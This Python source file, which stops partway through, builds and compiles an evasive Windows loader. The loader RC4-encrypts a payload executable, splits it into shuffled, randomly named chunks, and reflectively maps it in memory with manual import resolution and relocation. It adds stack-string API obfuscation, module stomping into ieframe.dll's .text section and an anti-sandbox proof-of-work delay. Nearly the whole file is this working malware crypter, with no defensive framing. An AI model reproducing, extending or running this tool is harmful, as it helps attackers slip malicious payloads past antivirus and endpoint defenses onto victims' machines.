import sys
import os
import random
import string
import subprocess
import argparse

COMPILER = "x86_64-w64-mingw32-g++"

COMPILER_FLAGS = [
    "--static",
    "-O2",
    "-s", "-Wl,--strip-all",
    "-fexceptions",
    "-fno-rtti",
    "-fno-ident",
    "-Wl,--image-base=0x14000000",
    "-fomit-frame-pointer",
    "-static-libgcc", "-static-libstdc++",
    "-Wl,--gc-sections", "-ffunction-sections", "-fdata-sections",
]


# =============================================================================
# Utilitaires Python
# =============================================================================

def compile_cpp(cpp_file: str, output_exe: str) -> bool:
    cmd = [COMPILER] + COMPILER_FLAGS + [cpp_file, "-o", output_exe]
    print("[+] Compilation en cours...")
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode != 0:
        print("    [-] Echec de la compilation :")
        print(result.stderr)
        return False
    print("    [>] Compilation reussie : " + output_exe)
    return True


def generate_random_name(prefix="", length=20):
    return prefix + ''.join(random.choices(string.ascii_letters, k=length))


def stack_string(varname: str, s: str) -> str:
    lines = [f'    char {varname}[{len(s)+1}];']
    for i, c in enumerate(s):
        lines.append(f'    {varname}[{i}] = 0x{ord(c):02X};')
    lines.append(f'    {varname}[{len(s)}] = 0x00;')
    return '\n'.join(lines)


def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for b in data:
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return bytes(out)


def generate_rc4_key(length: int = 32) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(length))


def vprintf(msg: str, verbose: bool) -> str:
    if not verbose:
        return ""
    return f'    printf({msg});\n'


# =============================================================================
# Generateurs de blocs C++ mutualisables
# =============================================================================

def gen_includes() -> str:
    code  = "#include <windows.h>\n"
    code += "#include <cstring>\n"
    code += "#include <cstdint>\n"
    code += "#include <cstdlib>\n"
    code += "#include <cstdio>\n"
    code += "#include <wincrypt.h>\n"
    code += "#pragma comment(lib, \"advapi32.lib\")\n\n"
    return code


def gen_rc4_key_globals(vn: dict, rc4_key: bytes) -> str:
    key_hex = ', '.join(f"0x{b:02X}" for b in rc4_key)
    code  = f"static const unsigned char {vn['rc4_key']}[] = {{ {key_hex} }};\n"
    code += f"static const int {vn['rc4_key_len']} = {len(rc4_key)};\n\n"
    return code


def gen_chunks(chunks: list, shuffled_order: list) -> str:
    code = ""
    for idx in shuffled_order:
        cname, cdata = chunks[idx]
        code += f"static const unsigned char {cname}[] = {{\n"
        for off in range(0, len(cdata), 16):
            row = cdata[off:off+16]
            code += "    " + ", ".join(f"0x{b:02X}" for b in row) + ",\n"
        code += "};\n\n"
    return code


def gen_reconstruct_func(vn: dict, chunks: list, original_order: list, verbose: bool) -> str:
    code  = f"static unsigned char* {vn['reconstruct_func']}() {{\n"
    code += vprintf(f'"[recon] allocation de %zu octets...\\n", (size_t){vn["pe_size"]}', verbose)
    code += f"    unsigned char* {vn['blob_ptr']} = (unsigned char*)VirtualAlloc(\n"
    code += f"        NULL, {vn['pe_size']}, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
    code += f"    if (!{vn['blob_ptr']}) {{"
    code += vprintf('"[recon] ECHEC VirtualAlloc\\n"', verbose)
    code += f" return NULL; }}\n"
    code += vprintf(f'"[recon] blob alloue a %p\\n", (void*){vn["blob_ptr"]}', verbose)
    code += f"    SIZE_T {vn['blob_pos']} = 0;\n"
    code += f"    DWORD {vn['tick_ref']};\n"

    for real_idx in original_order:
        cname, cdata = chunks[real_idx]
        code += f"    memcpy({vn['blob_ptr']} + {vn['blob_pos']}, {cname}, sizeof({cname}));\n"
        code += f"    {vn['blob_pos']} += sizeof({cname});\n"
        delay_ms = random.randint(2, 8)
        spin_val = random.randint(50, 200)
        code += f"    {vn['tick_ref']} = GetTickCount();\n"
        code += f"    while (GetTickCount() - {vn['tick_ref']} < {delay_ms}U) {{\n"
        code += f"        volatile int {vn['spin_k']} = {spin_val};\n"
        code += f"        (void){vn['spin_k']};\n"
        code += f"    }}\n"

    code += vprintf(f'"[recon] reconstruction OK : %zu octets copies\\n", (size_t){vn["blob_pos"]}', verbose)
    code += f"    return {vn['blob_ptr']};\n"
    code += "}\n\n"
    return code


def gen_decrypt_func(vn: dict, verbose: bool) -> str:
    code  = f"static void {vn['decrypt_func']}(unsigned char* {vn['encrypted_blob']}, SIZE_T len) {{\n"
    code += vprintf(f'"[rc4] dechiffrement de %zu octets...\\n", (size_t)len', verbose)
    code += f"    unsigned char {vn['rc4_S']}[256];\n"
    code += f"    int {vn['rc4_i']}, {vn['rc4_j']};\n"
    code += f"    unsigned char {vn['rc4_tmp']};\n"
    code += f"    for ({vn['rc4_i']} = 0; {vn['rc4_i']} < 256; {vn['rc4_i']}++)\n"
    code += f"        {vn['rc4_S']}[{vn['rc4_i']}] = (unsigned char){vn['rc4_i']};\n"
    code += f"    {vn['rc4_j']} = 0;\n"
    code += f"    for ({vn['rc4_i']} = 0; {vn['rc4_i']} < 256; {vn['rc4_i']}++) {{\n"
    code += f"        {vn['rc4_j']} = ({vn['rc4_j']} + {vn['rc4_S']}[{vn['rc4_i']}] + "
    code +=            f"{vn['rc4_key']}[{vn['rc4_i']} % {vn['rc4_key_len']}]) & 0xFF;\n"
    code += f"        {vn['rc4_tmp']} = {vn['rc4_S']}[{vn['rc4_i']}];\n"
    code += f"        {vn['rc4_S']}[{vn['rc4_i']}] = {vn['rc4_S']}[{vn['rc4_j']}];\n"
    code += f"        {vn['rc4_S']}[{vn['rc4_j']}] = {vn['rc4_tmp']};\n"
    code += f"    }}\n"
    code += f"    {vn['rc4_i']} = 0; {vn['rc4_j']} = 0;\n"
    code += f"    for (SIZE_T {vn['rc4_idx']} = 0; {vn['rc4_idx']} < len; {vn['rc4_idx']}++) {{\n"
    code += f"        {vn['rc4_i']} = ({vn['rc4_i']} + 1) & 0xFF;\n"
    code += f"        {vn['rc4_j']} = ({vn['rc4_j']} + {vn['rc4_S']}[{vn['rc4_i']}]) & 0xFF;\n"
    code += f"        {vn['rc4_tmp']} = {vn['rc4_S']}[{vn['rc4_i']}];\n"
    code += f"        {vn['rc4_S']}[{vn['rc4_i']}] = {vn['rc4_S']}[{vn['rc4_j']}];\n"
    code += f"        {vn['rc4_S']}[{vn['rc4_j']}] = {vn['rc4_tmp']};\n"
    code += f"        {vn['encrypted_blob']}[{vn['rc4_idx']}] ^= {vn['rc4_S']}[({vn['rc4_S']}[{vn['rc4_i']}] + {vn['rc4_S']}[{vn['rc4_j']}]) & 0xFF];\n"
    code += f"    }}\n"
    code += vprintf('"[rc4] dechiffrement OK\\n"', verbose)
    code += "}\n\n"
    return code


def gen_map_func(vn: dict, verbose: bool) -> str:
    code  = f"static unsigned char* {vn['map_func']}(unsigned char* src) {{\n"
    code += vprintf(f'"[map] lecture headers depuis src=%p\\n", (void*)src', verbose)
    code += f"    IMAGE_DOS_HEADER* {vn['dos']} = (IMAGE_DOS_HEADER*)src;\n"
    code += f"    if ({vn['dos']}->e_magic != IMAGE_DOS_SIGNATURE) {{"
    code += vprintf('"[map] ECHEC : magic DOS invalide\\n"', verbose)
    code += f" return NULL; }}\n"
    code += f"    IMAGE_NT_HEADERS* {vn['nt']} = (IMAGE_NT_HEADERS*)(src + {vn['dos']}->e_lfanew);\n"
    code += f"    if ({vn['nt']}->Signature != IMAGE_NT_SIGNATURE) {{"
    code += vprintf('"[map] ECHEC : signature NT invalide\\n"', verbose)
    code += f" return NULL; }}\n"
    code += f"    if ({vn['nt']}->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {{"
    code += vprintf('"[map] ECHEC : pas un PE64\\n"', verbose)
    code += f" return NULL; }}\n"
    code += f"    SIZE_T {vn['img_size']} = {vn['nt']}->OptionalHeader.SizeOfImage;\n"
    code += vprintf(f'"[map] SizeOfImage = 0x%zX\\n", (size_t){vn["img_size"]}', verbose)
    code += f"    {stack_string(vn['ss_valloc'], 'VirtualAlloc')}\n"
    code += f"    {stack_string(vn['hk32'], 'KERNEL32.DLL')}\n"
    code += f"    HMODULE _hk = GetModuleHandleA({vn['hk32']});\n"
    code += f"    typedef LPVOID (WINAPI *t_va)(LPVOID, SIZE_T, DWORD, DWORD);\n"
    code += f"    t_va {vn['p_valloc']} = (t_va)GetProcAddress(_hk, {vn['ss_valloc']});\n"
    code += f"    unsigned char* {vn['mapped']} = (unsigned char*){vn['p_valloc']}(\n"
    code += f"        NULL, {vn['img_size']}, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);\n"
    code += f"    if (!{vn['mapped']}) {{"
    code += vprintf('"[map] ECHEC VirtualAlloc\\n"', verbose)
    code += f" return NULL; }}\n"
    code += vprintf(f'"[map] image allouee a %p\\n", (void*){vn["mapped"]}', verbose)
    code += f"    memcpy({vn['mapped']}, src, {vn['nt']}->OptionalHeader.SizeOfHeaders);\n"
    code += vprintf('"[map] headers copies\\n"', verbose)
    code += f"    IMAGE_SECTION_HEADER* {vn['sec']} = IMAGE_FIRST_SECTION({vn['nt']});\n"
    code += vprintf(f'"[map] copie de %u sections...\\n", {vn["nt"]}->FileHeader.NumberOfSections', verbose)
    code += f"    for (int {vn['ii']} = 0; {vn['ii']} < {vn['nt']}->FileHeader.NumberOfSections; {vn['ii']}++) {{\n"
    code += f"        if ({vn['sec']}[{vn['ii']}].SizeOfRawData == 0) {{"
    if verbose:
        code += f" printf(\"[map]   section %d : SizeOfRawData=0, ignoree\\n\", {vn['ii']});"
    code += f" continue; }}\n"
    if verbose:
        code += f"        printf(\"[map]   section %d : %.8s  RVA=0x%X  raw=0x%X  size=0x%X\\n\",\n"
        code += f"               {vn['ii']}, {vn['sec']}[{vn['ii']}].Name,\n"
        code += f"               {vn['sec']}[{vn['ii']}].VirtualAddress,\n"
        code += f"               {vn['sec']}[{vn['ii']}].PointerToRawData,\n"
        code += f"               {vn['sec']}[{vn['ii']}].SizeOfRawData);\n"
    code += f"        memcpy({vn['mapped']} + {vn['sec']}[{vn['ii']}].VirtualAddress,\n"
    code += f"               src + {vn['sec']}[{vn['ii']}].PointerToRawData,\n"
    code += f"               {vn['sec']}[{vn['ii']}].SizeOfRawData);\n"
    code += f"    }}\n"
    code += vprintf(f'"[map] mapping OK -> %p\\n", (void*){vn["mapped"]}', verbose)
    code += f"    return {vn['mapped']};\n"
    code += "}\n\n"
    return code


def gen_imports_func(vn: dict, verbose: bool) -> str:
    code  = f"static int {vn['imports_func']}(unsigned char* base, IMAGE_NT_HEADERS* {vn['nt']}) {{\n"
    code += f"    {stack_string(vn['ss_loadlib'], 'LoadLibraryA')}\n"
    code += f"    {stack_string(vn['ss_getproc'], 'GetProcAddress')}\n"
    code += f"    {stack_string(vn['hk32'], 'KERNEL32.DLL')}\n"
    code += vprintf('"[imp] debut\\n"', verbose)
    code += f"    HMODULE _hk2 = GetModuleHandleA({vn['hk32']});\n"
    code += vprintf(f'"[imp] kernel32 = %p\\n", (void*)_hk2', verbose)
    code += f"    typedef HMODULE (WINAPI *t_ll)(LPCSTR);\n"
    code += f"    typedef FARPROC (WINAPI *t_gp)(HMODULE, LPCSTR);\n"
    code += f"    t_ll {vn['p_loadlib']}  = (t_ll)GetProcAddress(_hk2, {vn['ss_loadlib']});\n"
    code += f"    t_gp {vn['p_getproc']} = (t_gp)GetProcAddress(_hk2, {vn['ss_getproc']});\n"
    code += vprintf(f'"[imp] LoadLibraryA=%p GetProcAddress=%p\\n", (void*){vn["p_loadlib"]}, (void*){vn["p_getproc"]}', verbose)
    code += f"    DWORD _global_op = 0;\n"
    code += f"    VirtualProtect(base, {vn['nt']}->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &_global_op);\n"
    code += vprintf('"[imp] image entiere passee en RWX\\n"', verbose)
    code += f"    DWORD imp_rva = {vn['nt']}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;\n"
    code += vprintf('"[imp] imp_rva = 0x%X\\n", imp_rva', verbose)
    code += f"    if (imp_rva == 0) {{"
    code += vprintf('"[imp] pas de table d imports\\n"', verbose)
    code += f" return 1; }}\n"
    code += f"    IMAGE_IMPORT_DESCRIPTOR* {vn['imp_desc']} = (IMAGE_IMPORT_DESCRIPTOR*)(base + imp_rva);\n"
    code += vprintf(f'"[imp] premier descripteur = %p\\n", (void*){vn["imp_desc"]}', verbose)
    code += f"    int _di = 0;\n"
    code += f"    while ({vn['imp_desc']}->Name) {{\n"
    code += f"        char* {vn['mod_name']} = (char*)(base + {vn['imp_desc']}->Name);\n"
    if verbose:
        code += f"        printf(\"[imp] [%d] dll = '%s'\\n\", _di, {vn['mod_name']});\n"
    code += f"        HMODULE {vn['mod_handle']} = {vn['p_loadlib']}({vn['mod_name']});\n"
    if verbose:
        code += f"        printf(\"[imp] [%d] handle = %p\\n\", _di, (void*){vn['mod_handle']});\n"
    code += f"        if (!{vn['mod_handle']}) {{"
    if verbose:
        code += f" printf(\"[imp] [%d] ECHEC LoadLibrary\\n\", _di);"
    code += f" return 0; }}\n"
    if verbose:
        code += f"        printf(\"[imp] [%d] OriginalFirstThunk=0x%X FirstThunk=0x%X\\n\", _di,\n"
        code += f"               {vn['imp_desc']}->OriginalFirstThunk, {vn['imp_desc']}->FirstThunk);\n"
    code += f"        IMAGE_THUNK_DATA* {vn['thunk_orig']} = (IMAGE_THUNK_DATA*)(base + {vn['imp_desc']}->OriginalFirstThunk);\n"
    code += f"        IMAGE_THUNK_DATA* {vn['thunk_iat']}  = (IMAGE_THUNK_DATA*)(base + {vn['imp_desc']}->FirstThunk);\n"
    code += f"        int _fi = 0;\n"
    code += f"        while ({vn['thunk_orig']}->u1.AddressOfData) {{\n"
    code += f"            FARPROC fn = NULL;\n"
    code += f"            if ({vn['thunk_orig']}->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{\n"
    code += f"                WORD _ord = (WORD)({vn['thunk_orig']}->u1.Ordinal & 0xFFFF);\n"
    if verbose:
        code += f"                printf(\"[imp]   [%d] ordinal %u\\n\", _fi, _ord);\n"
    code += f"                fn = {vn['p_getproc']}({vn['mod_handle']}, (LPCSTR)(ULONG_PTR)_ord);\n"
    code += f"            }} else {{\n"
    code += f"                IMAGE_IMPORT_BY_NAME* ibn = (IMAGE_IMPORT_BY_NAME*)(base + {vn['thunk_orig']}->u1.AddressOfData);\n"
    if verbose:
        code += f"                printf(\"[imp]   [%d] '%s'\\n\", _fi, ibn->Name);\n"
    code += f"                fn = {vn['p_getproc']}({vn['mod_handle']}, ibn->Name);\n"
    code += f"            }}\n"
    code += f"            if (!fn) {{"
    if verbose:
        code += f" printf(\"[imp]   [%d] ECHEC GetProcAddress\\n\", _fi);"
    code += f" return 0; }}\n"
    code += f"            {vn['thunk_iat']}->u1.Function = (ULONGLONG)fn;\n"
    code += f"            {vn['thunk_orig']}++; {vn['thunk_iat']}++;\n"
    code += f"            _fi++;\n"
    code += f"        }}\n"
    if verbose:
        code += f"        printf(\"[imp] [%d] %d fonctions resolues\\n\", _di, _fi);\n"
    code += f"        {vn['imp_desc']}++;\n"
    code += f"        _di++;\n"
    code += f"    }}\n"
    code += vprintf('"[imp] resolution terminee OK\\n"', verbose)
    code += f"    return 1;\n"
    code += "}\n\n"
    return code


def gen_reloc_func(vn: dict, verbose: bool) -> str:
    code  = f"static void {vn['reloc_func']}(unsigned char* base, IMAGE_NT_HEADERS* {vn['nt']}) {{\n"
    code += f"    IMAGE_DATA_DIRECTORY {vn['reloc_dir']} = {vn['nt']}->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n"
    code += f"    if ({vn['reloc_dir']}.VirtualAddress == 0) {{"
    code += vprintf('"[reloc] pas de section de relocation\\n"', verbose)
    code += f" return; }}\n"
    code += f"    DWORD64 {vn['delta']} = (DWORD64)base - {vn['nt']}->OptionalHeader.ImageBase;\n"
    code += vprintf(f'"[reloc] delta = 0x%llX  ImageBase preferee = 0x%llX\\n", (unsigned long long){vn["delta"]}, (unsigned long long){vn["nt"]}->OptionalHeader.ImageBase', verbose)
    code += f"    if ({vn['delta']} == 0) {{"
    code += vprintf('"[reloc] pas de relocation necessaire\\n"', verbose)
    code += f" return; }}\n"
    code += f"    IMAGE_BASE_RELOCATION* {vn['reloc_blk']} = (IMAGE_BASE_RELOCATION*)(base + {vn['reloc_dir']}.VirtualAddress);\n"
    code += f"    int _blk_idx = 0;\n"
    code += f"    while ({vn['reloc_blk']}->VirtualAddress != 0) {{\n"
    code += f"        DWORD {vn['reloc_count']} = ({vn['reloc_blk']}->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;\n"
    if verbose:
        code += f"        printf(\"[reloc]   bloc %d : VirtualAddress=0x%X  entrees=%lu\\n\",\n"
        code += f"               _blk_idx, {vn['reloc_blk']}->VirtualAddress, (unsigned long){vn['reloc_count']});\n"
    code += f"        WORD* {vn['reloc_entries']} = (WORD*)({vn['reloc_blk']} + 1);\n"
    code += f"        for (DWORD {vn['ll']} = 0; {vn['ll']} < {vn['reloc_count']}; {vn['ll']}++) {{\n"
    code += f"            if (({vn['reloc_entries']}[{vn['ll']}] >> 12) == IMAGE_REL_BASED_DIR64) {{\n"
    code += f"                DWORD64* {vn['patch_ptr']} = (DWORD64*)(base + {vn['reloc_blk']}->VirtualAddress + ({vn['reloc_entries']}[{vn['ll']}] & 0xFFF));\n"
    code += f"                *{vn['patch_ptr']} += {vn['delta']};\n"
    code += f"            }}\n"
    code += f"        }}\n"
    code += f"        {vn['reloc_blk']} = (IMAGE_BASE_RELOCATION*)((unsigned char*){vn['reloc_blk']} + {vn['reloc_blk']}->SizeOfBlock);\n"
    code += f"        _blk_idx++;\n"
    code += f"    }}\n"
    code += vprintf('"[reloc] relocation OK : %d blocs traites\\n", _blk_idx', verbose)
    code += "}\n\n"
    return code


def gen_protect_func(vn: dict, verbose: bool) -> str:
    code  = f"static void {vn['protect_func']}(unsigned char* base, IMAGE_NT_HEADERS* {vn['nt']}) {{\n"
    code += vprintf('"[prot] application des permissions par section...\\n"', verbose)
    code += f"    {stack_string(vn['ss_vprot'], 'VirtualProtect')}\n"
    code += f"    {stack_string(vn['hk32'], 'KERNEL32.DLL')}\n"
    code += f"    HMODULE _hk3 = GetModuleHandleA({vn['hk32']});\n"
    code += f"    typedef BOOL (WINAPI *t_vp)(LPVOID, SIZE_T, DWORD, PDWORD);\n"
    code += f"    t_vp {vn['p_vprot']} = (t_vp)GetProcAddress(_hk3, {vn['ss_vprot']});\n"
    code += f"    IMAGE_SECTION_HEADER* {vn['sec']} = IMAGE_FIRST_SECTION({vn['nt']});\n"
    code += f"    DWORD {vn['old_prot']};\n"
    code += f"    for (int {vn['jj']} = 0; {vn['jj']} < {vn['nt']}->FileHeader.NumberOfSections; {vn['jj']}++) {{\n"
    code += f"        DWORD {vn['new_prot']} = PAGE_READONLY;\n"
    code += f"        DWORD ch = {vn['sec']}[{vn['jj']}].Characteristics;\n"
    code += f"        if (ch & IMAGE_SCN_MEM_EXECUTE) {{\n"
    code += f"            {vn['new_prot']} = PAGE_EXECUTE_READ;\n"
    code += f"        }} else if (ch & IMAGE_SCN_MEM_WRITE) {{\n"
    code += f"            {vn['new_prot']} = PAGE_READWRITE;\n"
    code += f"        }}\n"
    if verbose:
        code += f"        printf(\"[prot]   section %d : %.8s  prot=0x%X\\n\",\n"
        code += f"               {vn['jj']}, {vn['sec']}[{vn['jj']}].Name, {vn['new_prot']});\n"
    code += f"        {vn['p_vprot']}(base + {vn['sec']}[{vn['jj']}].VirtualAddress,\n"
    code += f"                  {vn['sec']}[{vn['jj']}].Misc.VirtualSize,\n"
    code += f"                  {vn['new_prot']}, &{vn['old_prot']});\n"
    code += f"    }}\n"
    code += vprintf('"[prot] permissions appliquees OK\\n"', verbose)
    code += "}\n\n"
    return code


def gen_exec_func(vn: dict, verbose: bool) -> str:
    code  = f"static void {vn['exec_func']}(unsigned char* base) {{\n"
    code += f"    IMAGE_DOS_HEADER* {vn['dos']} = (IMAGE_DOS_HEADER*)base;\n"
    code += f"    IMAGE_NT_HEADERS* {vn['nt']}  = (IMAGE_NT_HEADERS*)(base + {vn['dos']}->e_lfanew);\n"
    code += f"    DWORD64 {vn['ep']} = (DWORD64)base + {vn['nt']}->OptionalHeader.AddressOfEntryPoint;\n"
    code += vprintf(f'"[exec] base=%p  EP_RVA=0x%X  EP_abs=%p\\n", (void*)base, {vn["nt"]}->OptionalHeader.AddressOfEntryPoint, (void*){vn["ep"]}', verbose)
    code += vprintf('"[exec] lancement...\\n"', verbose)
    code += f"    typedef DWORD (WINAPI *ep_t)(void);\n"
    code += f"    ((ep_t){vn['ep']})();\n"
    code += vprintf('"[exec] retour de l EP\\n"', verbose)
    code += "}\n\n"
    return code


def gen_antisandbox(vn: dict) -> str:
    code  = f"    {{\n"
    code += f"        HCRYPTPROV {vn['pow_prov']} = 0;\n"
    code += f"        CryptAcquireContextA(&{vn['pow_prov']}, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);\n"
    code += f"        uint64_t {vn['pow_nonce']} = 0;\n"
    code += f"        while (1) {{\n"
    code += f"            HCRYPTHASH {vn['pow_hash']} = 0;\n"
    code += f"            CryptCreateHash({vn['pow_prov']}, CALG_SHA_256, 0, 0, &{vn['pow_hash']});\n"
    code += f"            CryptHashData({vn['pow_hash']}, (BYTE*)&{vn['pow_nonce']}, 8, 0);\n"
    code += f"            BYTE {vn['pow_digest']}[32]; DWORD {vn['pow_dlen']} = 32;\n"
    code += f"            CryptGetHashParam({vn['pow_hash']}, HP_HASHVAL, {vn['pow_digest']}, &{vn['pow_dlen']}, 0);\n"
    code += f"            CryptDestroyHash({vn['pow_hash']});\n"
    code += f"            if ({vn['pow_digest']}[0] == 0 && {vn['pow_digest']}[1] == 0 &&\n"
    code += f"                {vn['pow_digest']}[2] == 0 && {vn['pow_digest']}[3] < 0x40) break;\n"
    code += f"            {vn['pow_nonce']}++;\n"
    code += f"        }}\n"
    code += f"        CryptReleaseContext({vn['pow_prov']}, 0);\n"
    code += f"    }}\n"
    return code


def gen_stomp_func(vn: dict, verbose: bool) -> str:
    code  = f"static unsigned char* {vn['stomp_func']}(unsigned char* decrypted_pe, int pe_size) {{\n"
    code += vprintf('"[stomp] Chargement de la DLL cible...\\n"', verbose)
    code += f"    {stack_string(vn['ss_msvcp_win'], 'ieframe.dll')}\n"
    code += f"    HMODULE {vn['h_shell32']} = LoadLibraryA({vn['ss_msvcp_win']});\n"
    code += f"    if (!{vn['h_shell32']}) {{"
    code += vprintf('"[stomp] ECHEC : LoadLibraryA\\n"', verbose)
    code += f" return NULL; }}\n"
    code += vprintf(f'"[stomp] DLL chargee a l adresse : %p\\n", (void*){vn["h_shell32"]}', verbose)
    code += f"    IMAGE_DOS_HEADER* {vn['dos']} = (IMAGE_DOS_HEADER*){vn['h_shell32']};\n"
    code += f"    if ({vn['dos']}->e_magic != IMAGE_DOS_SIGNATURE) {{"
    code += vprintf('"[stomp] ECHEC : magic DOS invalide\\n"', verbose)
    code += f" return NULL; }}\n"
    code += vprintf('"[stomp] Headers PE de la DLL valides\\n"', verbose)
    code += f"    IMAGE_NT_HEADERS* {vn['nt_headers']} = (IMAGE_NT_HEADERS*)((unsigned char*){vn['h_shell32']} + {vn['dos']}->e_lfanew);\n"
    code += f"    int nb_sections = {vn['nt_headers']}->FileHeader.NumberOfSections;\n"
    code += vprintf('"[stomp] Nombre de sections dans la DLL : %d\\n", nb_sections', verbose)
    code += f"    IMAGE_SECTION_HEADER* {vn['section']} = IMAGE_FIRST_SECTION({vn['nt_headers']});\n"
    code += f"    unsigned char* stomp_addr = NULL;\n"
    code += f"    DWORD {vn['sec_size']} = 0;\n"
    code += f"    const char* sec_name = \".text\";\n"
    code += f"    for (int i = 0; i < nb_sections; i++) {{\n"
    if verbose:
        code += f"        printf(\"[stomp] Section trouvee : %.8s  VirtualSize = %lu\\n\",\n"
        code += f"               {vn['section']}[i].Name, (unsigned long){vn['section']}[i].Misc.VirtualSize);\n"
    code += f"        if (memcmp({vn['section']}[i].Name, sec_name, strlen(sec_name)) == 0) {{\n"
    code += f"            if ({vn['section']}[i].Misc.VirtualSize >= (DWORD)pe_size) {{\n"
    code += f"                stomp_addr = (unsigned char*){vn['h_shell32']} + {vn['section']}[i].VirtualAddress;\n"
    code += f"                {vn['sec_size']} = {vn['section']}[i].Misc.VirtualSize;\n"
    if verbose:
        code += f"                printf(\"[stomp] Section .text trouvee : addr=%p  VirtualSize=%lu  pe_size=%d\\n\",\n"
        code += f"                       (void*)stomp_addr, (unsigned long){vn['sec_size']}, pe_size);\n"
    code += f"                break;\n"
    code += f"            }} else {{\n"
    if verbose:
        code += f"                printf(\"[stomp] ECHEC : section trop petite : %lu octets disponibles, %d necessaires\\n\",\n"
        code += f"                       (unsigned long){vn['section']}[i].Misc.VirtualSize, pe_size);\n"
    code += f"            }}\n"
    code += f"        }}\n"
    code += f"    }}\n\n"
    code += f"    if (!stomp_addr) {{\n"
    code += vprintf('"[stomp] ECHEC : section .text non trouvee ou trop petite\\n"', verbose)
    code += f"        return NULL;\n"
    code += f"    }}\n\n"
    code += f"    DWORD {vn['old_protect']};\n"
    code += f"    BOOL vp_ok = VirtualProtect(stomp_addr, pe_size, PAGE_READWRITE, &{vn['old_protect']});\n"
    code += f"    if (!vp_ok) {{\n"
    if verbose:
        code += f"        printf(\"[stomp] ECHEC : VirtualProtect RW -> erreur %lu\\n\", (unsigned long)GetLastError());\n"
    code += f"        return NULL;\n"
    code += f"    }}\n"
    code += vprintf('"[stomp] VirtualProtect PAGE_READWRITE OK\\n"', verbose)
    code += f"    memcpy(stomp_addr, decrypted_pe, pe_size);\n"
    code += vprintf('"[stomp] Payload copie dans la section .text\\n"', verbose)
    code += f"    return stomp_addr;\n"
    code += "}\n\n"
    return code


# =============================================================================
# Variables nommees aleatoirement (pool commun)
# =============================================================================

def make_vn() -> dict:
    keys = [
        "pe_size",
        "rc4_key", "rc4_key_len",
        "rc4_S", "rc4_i", "rc4_j", "rc4_tmp", "rc4_out", "rc4_idx",
        "decrypt_func",
        "encrypted_blob", "blob_ptr", "blob_pos",
        "reconstruct_func",
        "stomp_func",
        "map_func",
        "imports_func",
        "reloc_func",
        "protect_func",
        "exec_func",
        "dos", "nt", "sec",
        "mapped", "img_size",
        "old_prot", "new_prot",
        "imp_desc", "mod_name", "mod_handle",
        "thunk_orig", "thunk_iat",
        "imp_byname",
        "reloc_dir", "reloc_blk", "reloc_entries", "reloc_count",
        "delta", "patch_ptr",
        "ep", "thread_handle",
        "ii", "jj", "kk", "ll",
        "tick_ref", "spin_k",
        "ss_valloc", "ss_vprot", "ss_loadlib",
        "ss_getproc", "ss_crthread", "ss_waitobj",
        "hk32",
        "p_valloc", "p_vprot", "p_loadlib",
        "p_getproc", "p_crthread", "p_waitobj",
        "pow_prov", "pow_nonce", "pow_hash", "pow_digest", "pow_dlen",
        "context_flag",
        "ss_msvcp_win", "h_shell32",
        "stomped_base", "stomped_size",
        "sec_hdr", "sec_idx",
        "found_sec", "found_base", "found_size",
        "vp_old", "target_dll", "nt_headers", "section",
        "sec_size", "old_protect",
    ]
    return {k: generate_random_name() for k in keys}


# =============================================================================
# Preparation des chunks chiffres (commune aux 2 modes)
# =============================================================================

def prepare_chunks(input_file: str, rc4_key: bytes):
    with open(input_file, "rb") as f:
        pe_data = f.read()
    pe_size = len(pe_data)
    print(f"[+] Taille du PE : {pe_size} octets")

    encrypted = rc4_crypt(pe_data, rc4_key)
    print("[+] Chiffrement RC4 OK")

    chunk_size = random.randint(512, 2048)
    chunks = []
    offset = 0
    while offset < len(encrypted):
        block = encrypted[offset:offset+chunk_size]
        cname = generate_random_name()
        chunks.append((cname, block))
        offset += chunk_size
    print(f"[+] {len(chunks)} chunks de {chunk_size} octets")

    original_order = list(range(len(chunks)))
    shuffled_order = original_order[:]
    random.shuffle(shuffled_order)

    return pe_size, chunks, original_order, shuffled_order


# =============================================================================
# generate_loader  (mode classique VirtualAlloc)
# =============================================================================

def generate_loader(input_file: str, output_file: str = None, verbose: bool = False):
    rc4_key = generate_rc4_key()
    vn = make_vn()
    pe_size, chunks, original_order, shuffled_order = prepare_chunks(input_file, rc4_key)

    code  = gen_includes()
    code += f"static const SIZE_T {vn['pe_size']} = {pe_size}ULL;\n\n"
    code += gen_rc4_key_globals(vn, rc4_key)

    print("[+] Emission des chunks...")
    code += gen_chunks(chunks, shuffled_order)

    code += gen_reconstruct_func(vn, chunks, original_order, verbose)
    code += gen_decrypt_func(vn, verbose)
    code += gen_map_func(vn, verbose)
    code += gen_imports_func(vn, verbose)
    code += gen_reloc_func(vn, verbose)
    code += gen_protect_func(vn, verbose)
    code += gen_exec_func(vn, verbose)

    # main
    code += "int main(void) {\n"
    code += gen_antisandbox(vn)

    if verbose:
        code += f'    printf("Etape 1 : reconstruction du blob chiffre en memoire temporaire\\n");\n'
    code += f"    unsigned char* blob = {vn['reconstruct_func']}();\n"
    code += f"    if (!blob) return 1;\n\n"

    if verbose:
        code += f'    printf("Etape 2 : dechiffrement RC4\\n");\n'
    code += f"    {vn['decrypt_func']}(blob, {vn['pe_size']});\n\n"

    if verbose:
        code += f'    printf("Etape 3 : mapping PE\\n");\n'
    code += f"    unsigned char* {vn['mapped']} = {vn['map_func']}(blob);\n"
    code += f"    VirtualFree(blob, 0, MEM_RELEASE);\n"
    code += f"    if (!{vn['mapped']}) return 1;\n\n"

    if verbose:
